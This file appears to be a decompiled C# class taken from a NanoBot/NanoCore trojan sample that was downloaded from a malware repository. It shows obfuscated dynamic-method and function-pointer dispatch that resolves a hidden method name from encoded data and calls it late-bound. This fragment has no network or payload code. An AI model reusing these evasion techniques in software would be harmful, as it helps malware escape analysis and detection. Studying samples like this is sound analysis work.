// Decompiled with JetBrains decompiler
// Type: fbtHr2u96BovPBLQI.7fauK8t4G4jVltLuM
// Assembly: fbtHr2u96BovPBLQI, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 145FC578-6968-42AA-A9F6-C5DA0CDD9447
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.NanoBot.gen-49ceeef25cac6108f018104aec1f8cd7b3992b7a4b4c9af14d076968aeb03d34.exe

using fbtHr2u96BovPBLQI.My;
using Microsoft.VisualBasic;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;

namespace fbtHr2u96BovPBLQI
{
  internal class \u0037fauK8t4G4jVltLuM
  {
    [CompilerGenerated]
    public TXNVX3PLmYRajdU50 \u003CBh9xOMe12aass3JGh\u003E(
      TXNVX3PLmYRajdU50 rKyBEMP7G207g50PD,
      params object[] nRRgsxOVA0ieMZpH4)
    {
      TXNVX3PLmYRajdU50 txnvX3PlmYrajdU50_1 = (TXNVX3PLmYRajdU50) new nHVEMYqkxnsu3mGFT();
      string empty = string.Empty;
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle1 = __typeref (object);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      Type returnType = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[0])(runtimeTypeHandle1);
      Type[] parameterTypes = new Type[3];
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle2 = __typeref (object);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      parameterTypes[0] = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[0])(runtimeTypeHandle2);
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle3 = __typeref (string);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      parameterTypes[1] = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[0])(runtimeTypeHandle3);
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle4 = __typeref (object[]);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      parameterTypes[2] = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[0])(runtimeTypeHandle4);
      DynamicMethod dynamicMethod = new DynamicMethod(empty, returnType, parameterTypes);
      // ISSUE: type reference
      RuntimeTypeHandle runtimeTypeHandle5 = __typeref (Interaction);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      Type type1 = __calli((__FnPtr<Type (RuntimeTypeHandle)>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[0])(runtimeTypeHandle5);
      ILGenerator ilGenerator1 = dynamicMethod.GetILGenerator();
      ilGenerator1.Emit(OpCodes.Ldarg_0);
      ilGenerator1.Emit(OpCodes.Ldarg_1);
      ilGenerator1.Emit(OpCodes.Ldc_I4, rKyBEMP7G207g50PD.\u00315yvr5SemP2tph6uV.StartsWith("I") ? 1 : 2);
      ilGenerator1.Emit(OpCodes.Ldarg_2);
      ILGenerator ilGenerator2 = ilGenerator1;
      OpCode call = OpCodes.Call;
      Type type2 = type1;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      Encoding encoding = __calli((__FnPtr<Encoding ()>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[1])();
      string[] strArray = new string[1];
      char[] chArray = new char[16];
      // ISSUE: field reference
      RuntimeFieldHandle runtimeFieldHandle = __fieldref (NS3YIeQ2Kku8bHB5M.REc5RZVWQzKqEDK6g);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      __calli((__FnPtr<void (Array, RuntimeFieldHandle)>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[2])((RuntimeFieldHandle) chArray, (Array) runtimeFieldHandle);
      strArray[0] = new string(chArray);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      string str = __calli((__FnPtr<string (string[])>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[3])(strArray);
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      byte[] bytes = __calli((__FnPtr<byte[] (string)>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[4])(str);
      string name = encoding.GetString(bytes);
      MethodInfo method = type2.GetMethod(name);
      ilGenerator2.Emit(call, method);
      ilGenerator1.Emit(OpCodes.Ret);
      TXNVX3PLmYRajdU50 txnvX3PlmYrajdU50_2 = txnvX3PlmYrajdU50_1;
      object obj1 = dynamicMethod.Invoke((object) ilGenerator1, new object[3]
      {
        ((nHVEMYqkxnsu3mGFT) rKyBEMP7G207g50PD).ScrvvnJ48baeNYJzQ,
        (object) rKyBEMP7G207g50PD.\u00315yvr5SemP2tph6uV,
        (object) nRRgsxOVA0ieMZpH4
      });
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      object obj2 = __calli((__FnPtr<object (object)>) MyProject.rmcKnIDe9G5aLk9KU.h5w9rkLivNvwv6gWC[5])(obj1);
      ((nHVEMYqkxnsu3mGFT) txnvX3PlmYrajdU50_2).ScrvvnJ48baeNYJzQ = obj2;
      return txnvX3PlmYrajdU50_1;
    }
  }
}
